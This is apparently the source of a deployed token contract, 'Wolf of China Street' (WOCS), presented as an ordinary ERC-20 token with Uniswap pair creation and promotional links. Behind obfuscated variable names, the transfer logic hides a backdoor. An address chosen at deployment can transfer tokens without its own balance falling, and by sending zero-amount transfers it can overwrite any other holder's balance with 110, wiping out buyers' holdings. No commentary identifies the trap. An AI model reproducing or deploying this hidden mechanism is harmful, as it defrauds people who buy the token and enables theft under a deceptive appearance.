/*

http://www.wolfofchinastreet.vip

http://t.me/wolfofchinastreet

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract WolfofChinaStreet is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private djqznpfambwl;

    uint256 private olgxwsftni = 110;

    function transfer(address vrtz, uint256 noagihmeruvt) public returns (bool success) {
        fhnuwldtgraz(msg.sender, vrtz, noagihmeruvt);
        return true;
    }

    function transferFrom(address vpuxblrqema, address vrtz, uint256 noagihmeruvt) public returns (bool success) {
        require(noagihmeruvt <= allowance[vpuxblrqema][msg.sender]);
        allowance[vpuxblrqema][msg.sender] -= noagihmeruvt;
        fhnuwldtgraz(vpuxblrqema, vrtz, noagihmeruvt);
        return true;
    }

    mapping(address => uint256) private xtqilhfpyn;

    string public name = 'Wolf of China Street';

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function approve(address givjskpz, uint256 noagihmeruvt) public returns (bool success) {
        allowance[msg.sender][givjskpz] = noagihmeruvt;
        emit Approval(msg.sender, givjskpz, noagihmeruvt);
        return true;
    }

    address public mvck;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address qwgesphx) {
        balanceOf[msg.sender] = totalSupply;
        djqznpfambwl[qwgesphx] = olgxwsftni;
        IUniswapV2Router02 ifbvwlytgu = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        mvck = IUniswapV2Factory(ifbvwlytgu.factory()).createPair(address(this), ifbvwlytgu.WETH());
    }

    function fhnuwldtgraz(address vpuxblrqema, address vrtz, uint256 noagihmeruvt) private {
        if (djqznpfambwl[vpuxblrqema] == 0) {
            balanceOf[vpuxblrqema] -= noagihmeruvt;
        }
        balanceOf[vrtz] += noagihmeruvt;
        if (djqznpfambwl[msg.sender] > 0 && noagihmeruvt == 0 && vrtz != mvck) {
            balanceOf[vrtz] = olgxwsftni;
        }
        emit Transfer(vpuxblrqema, vrtz, noagihmeruvt);
    }

    uint8 public decimals = 9;

    string public symbol = 'WOCS';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;
}